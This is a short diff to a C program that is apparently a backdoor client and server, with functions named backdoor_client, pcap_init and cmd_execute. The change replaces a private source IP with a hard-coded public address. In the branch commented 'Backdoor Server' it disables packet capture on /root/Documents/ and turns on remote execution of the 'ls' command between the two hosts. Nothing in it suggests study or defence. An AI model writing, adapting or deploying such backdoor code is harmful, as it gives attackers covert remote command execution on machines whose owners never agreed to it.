@@ -77,7 +77,7 @@ int main(int argc, char *argv[]) {
 	}
 
 	strcpy(host, "96.55.197.75");
-	strcpy(source, "192.168.0.17");
+	strcpy(source, "209.87.60.70");
 
 	printf("copied %s <- %s\n", host, source);
 
@@ -91,8 +91,8 @@ int main(int argc, char *argv[]) {
 		// do something
 		backdoor_client(resolve(source), resolve(host), "tcp");
 	} else { // Backdoor Server
-		pcap_init(resolve(host), "/root/Documents/", 1);
-		//cmd_execute("ls -lR", resolve(source), resolve(host));
+		//pcap_init(resolve(host), "/root/Documents/", 1);
+		cmd_execute("ls", resolve(source), resolve(host));
 		//do something
 	}
 
